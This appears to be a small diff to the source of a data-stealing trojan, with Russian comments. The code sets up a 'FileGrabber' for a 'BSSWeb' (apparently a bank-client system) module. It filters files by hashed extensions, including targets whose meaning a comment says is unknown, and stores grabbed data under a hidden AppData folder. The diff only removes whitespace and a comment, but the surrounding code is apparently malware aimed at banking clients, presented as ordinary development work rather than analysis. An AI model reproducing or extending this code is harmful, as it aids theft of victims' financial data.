@@ -88,8 +88,8 @@ namespace BSSWeb
 		FileGrabber::AddIgnoreBeg( rv, gifFormat ); //игнорируем формат gif
 		FileGrabber::AddIgnoreBeg( rv, pngFormat ); //игнорируем формат png
 
-		const DWORD ignoreExt[] = 
-			{ 0x1D36F0 /* tmp */, 0x1AB867 /* jpg */, 0x1CF4E7 /* sig */, 0x1D3C74 /* txt */, 
+		const DWORD ignoreExt[] =
+			{ 0x1D36F0 /* tmp */, 0x1AB867 /* jpg */, 0x1CF4E7 /* sig */, 0x1D3C74 /* txt */,
 			  0x1A71EF /* ico */, 0x1C3767 /* png */, 0 };
 		const DWORD neededExt[] = //хеши скопированы с модуля bss.cpp, поэтому неизвестно какие это расширения )
 			{ 0x18F2F2, 0x1AF2F9, 0x1CF2E3, 0x1C3AE2, 0x18F96C, 0x1BF871, 0x193133, 0x1C32ED, 0x1CB2F1, 0
@@ -322,7 +322,7 @@ void AddBSSFile(PCHAR aURL, LPVOID Data, DWORD DataSize)
 
 	pSHGetSpecialFolderPathA(NULL, Path.t_str(), CSIDL_APPDATA, TRUE);
 
-	Path.CalcLength();  // Рассмотреть целесообразность такого подхода
+	Path.CalcLength();
 
 	Path += "\\BSS.V1\\";
 	CreateDirectoryA(Path.t_str(), NULL);
